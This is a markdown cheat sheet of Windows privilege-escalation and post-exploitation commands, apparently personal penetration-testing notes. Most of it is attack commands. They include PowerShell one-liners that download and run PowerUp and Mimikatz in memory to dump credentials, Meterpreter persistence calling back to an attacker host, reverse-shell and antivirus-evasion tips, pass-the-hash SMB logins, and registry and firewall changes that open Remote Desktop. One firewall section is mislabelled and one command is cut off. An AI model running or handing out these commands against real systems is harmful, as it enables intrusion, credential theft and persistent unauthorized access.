# Privilege Escalation

## basic enumeration
Get Version:
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
Check for other drives via meterpreter:
`show_mount`
List intalled programs via meterpreter:
`reg query HKEY_LOCAL_MACHINE\SOFTWARE`
Use powerup in memory without touching disk:
`IEX(New-Object Net.WebClient).DownloadString("http://<ip>:<port>/PowerUp.ps1");Invoke-AllChecks
`

## check the Linux Subsystem for interesting files
Its available in Windows 10 and Server 2016+, usually the path looks like this:
`C:\Users\<name>\AppData\Local\Packages\CanonicalGroup...`


## Persistence
`run persistence -U -i 60 -p <LPORT> -r <LHOST>`


## Searching

Writeable directories:
`dir /a-r-d /s /b`
Files by name:
`dir /s *foo*`
Files by content:
`findstr /s /i <needle> *.*`
Files by owner:
`DIR C:\*.* /S /Q|FIND /i "owner"`  
Search in meterpreter by extension:
`search -f *.<ext>`


## check named pipes

PS `[System.IO.Directory]::GetFiles("\\.\\pipe\\")`


## reverse shell

If no AV is present you can upload the simple nc.exe from Seclists. 

Otherwise Unicorn generates great powershell and hta shells that are difficult to detect. These can be converted with PS2EXE to PE Files when that is required.


## av evasion

* shelter https://www.shellterproject.com/download/ can inject shellcode into legit 32-Bit Executables and is likely to get not detected

## runas

The tool `runas` can use cached credentials with the `/savecred` option, however it will open a new `cmd.exe` which is a problem with remote shells.

```bash cheat runas runas with savecred
runas /user:administrator /savecred "cmd.exe /k whoami"
```

## misc

* you can import empires power-up into meterpreter (https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/)
* escape character in windows is `^`

## isos

* You can get get legit Windows-VMs from https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

## SMB

```bash cheat smb enumerate
smbmap -R -H \\<ip>

smbclient -L \\<ip> -N

smbclient \\<ip>\share -U <user>

smbget -R <ip>

```

```bash cheat smb login
python2 /usr/bin/smbclient.py <Domain>/<user>@<ip> -hashes <part1>:<part2>

auxiliary/scanner/smb/smb_login  

crackmapexec <ip(s)> -d <domain> -u <user> -p <pass>

exploit/windows/smb/psexec

net use z: \\<ip>\c$ /user:<username> <password>
```

* https://blog.ropnop.com/using-credentials-to-own-windows-boxes/

## Firewall

### Disable Firewall on Windows 7

Changing /d 0, to /d 1.
`Reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f`

Or via powershell:
`powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`

### Enable Remote Desktop

`netsh advfirewall firewall set rule group="Remotedesktop" new enable=yes`

Or via powershell:
`powershell.exe -ExecutionPolicy Bypass -command 'Enable-NetFirewallRule -DisplayGroup "Remote Desktop"'`

These need a group name. Get them via:
`netsh advfirewall firewall show rule name=all|find "Gruppierung:"`

## RDP

Good clients are xfreerdp, rdesktop and remmina. PTH-Attacks are possible with xfreerdp (See http://www.fuzzysecurity.com/tutorials/16.html).

## In Memory Powershell Payload Download & Execution

`IEX(New-Object Net.WebClient).downloadString('<url>/<payload>') ;<methodName>`

### Useful Payloads:

```bash cheat powerup PowerUp:
IEX(New-Object Net.WebClient).downloadString('<url>/PowerUp.ps1') ;Invoke-AllChecks
```

```bash cheat mimikatz mimikatz powershell:
IEX(New-Object Net.WebClient).downloadString('<url>/MimiKatz.ps1') ;Invoke-Mimikatz -DumpCreds
```

## Powershell Download File

Pay attention to the -Outfile it is very much needed
`Invoke-WebRequest "http://<ip>:<port>/<in file>" -OutFile "<out file>"`

## Powershell in Meterpreter

`load powershell` + `powershell_shell`

## Persistence

`run persistence -U -i 60 -p <LPORT> -r <LHOST>`

## links

* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

tags: #privilege_escalation #privesc #windows #powershell #iex 
